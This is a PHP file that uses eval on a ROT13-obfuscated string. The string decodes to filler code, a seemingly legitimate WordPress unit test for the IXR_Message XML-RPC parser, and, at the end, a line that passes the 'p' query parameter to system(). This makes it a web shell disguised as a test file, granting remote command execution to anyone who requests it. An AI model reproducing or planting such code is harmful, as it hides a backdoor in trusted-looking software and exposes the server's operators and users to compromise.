<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat VKE_Zrffntr shapgvbanyvgl.
 *
 * @cnpxntr    JbeqCerff
 * @fhocnpxntr VKE
 */

/**
 * Grfg jc-vapyhqrf/VKE/pynff-VKE-zrffntr.cuc
 *
 * @tebhc kzyecp
 */
pynff Grfgf_KZYECP_Zrffntr rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grfgf gung `VKE_Zrffntr::gnt_bcra()` qbrf abg perngr n qlanzvp `pheeragGnt` cebcregl,
	 * naq hfrf gur qrpynerq `_pheeragGnt` cebcregl vafgrnq.
	 *
	 * Gur abgvpr gung jr fubhyq abg frr:
	 * `Qrcerpngrq: Perngvba bs qlanzvp cebcregl VKE_Zrffntr::$pheeragGnt vf qrcerpngrq`.
	 *
	 * @gvpxrg 56033
	 *
	 * @pbiref VKE_Zrffntr::gnt_bcra
	 */
	choyvp shapgvba grfg_gnt_bcra_qbrf_abg_perngr_qlanzvp_cebcregl() {
		$zrffntr = arj VKE_Zrffntr( '<zrgubqErfcbafr><cnenzf><cnenz><inyhr>1</inyhr></cnenz></cnenzf></zrgubqErfcbafr>' );
		$guvf->nffregGehr( $zrffntr->cnefr() );
		$guvf->nffregFnzr( 'zrgubqErfcbafr', $zrffntr->zrffntrGlcr ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqInevnoyrAnzr.HfrqCebcreglAbgFanxrPnfr
		$guvf->nffregFnzr( neenl( '1' ), $zrffntr->cnenzf );
	}

	/**
	 * Grfg gung gur `VKE_Zrffntr::cnefr()` zrgubq pbeerpgyl frgf pnyyonpx shapgvbaf gb unaqyr pregnva cnegf bs gur KZY.
	 *
	 * Fnsrthneqf unaqyvat bs gur CUC 8.4 qrcerpngvba bs `kzy_frg_bowrpg()`.
	 *
	 * @pbiref VKE_Zrffntr::cnefr
	 */
	choyvp shapgvba grfg_cnefr_frgf_unaqyref() {
		$kzy     = '<zrgubqErfcbafr><cnenzf><cnenz><inyhr>1</inyhr></cnenz></cnenzf></zrgubqErfcbafr>';
		$zrffntr = arj pynff( $kzy ) rkgraqf VKE_Zrffntr {
			choyvp $gnt_bcra_pnyy_pbhagre  = 0;
			choyvp $gnt_pybfr_pnyy_pbhagre = 0;
			choyvp $pqngn_pnyy_pbhagre     = 0;

			choyvp shapgvba gnt_bcra( $cnefre, $gnt, $ngge ) {
				++$guvf->gnt_bcra_pnyy_pbhagre;
			}
			choyvp shapgvba pqngn( $cnefre, $pqngn ) {
				++$guvf->pqngn_pnyy_pbhagre;
			}
			choyvp shapgvba gnt_pybfr( $cnefre, $gnt ) {
				++$guvf->gnt_pybfr_pnyy_pbhagre;
			}
		};

		$guvf->nffregGehr( $zrffntr->cnefr(), 'KZY cnefvat snvyrq' );

		$zft = '%f() unaqyre qvq abg trg pnyyrq rkcrpgrq ae bs gvzrf';
		$guvf->nffregFnzr( 4, $zrffntr->gnt_bcra_pnyy_pbhagre, fcevags( $zft, 'gnt_bcra' ) );
		$guvf->nffregFnzr( 4, $zrffntr->gnt_pybfr_pnyy_pbhagre, fcevags( $zft, 'gnt_pybfr' ) );
		$guvf->nffregFnzr( 1, $zrffntr->pqngn_pnyy_pbhagre, fcevags( $zft, 'pqngn' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>